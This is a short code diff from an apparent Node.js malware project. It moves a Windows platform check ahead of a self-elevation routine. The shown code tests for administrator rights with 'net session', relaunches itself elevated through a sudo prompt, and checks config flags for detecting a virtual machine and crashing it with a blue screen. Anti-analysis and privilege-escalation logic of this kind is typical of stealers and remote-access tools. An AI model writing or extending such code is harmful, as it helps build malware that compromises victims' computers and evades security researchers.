@@ -9,12 +9,12 @@ const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
 spawnSync('explorer', [tempFolder]);
 
+if (os.platform() !== 'win32') process.exit();
 try {
   execFileSync('net', ['session'], { 'stdio': 'ignore' });
 } catch (e) {
   sudo.exec(resolve(__filename));
 }
-if (os.platform() !== 'win32') process.exit();
 
 if (config.vmProtect && checkVM()) {
   if (config.bsodIfVm) {
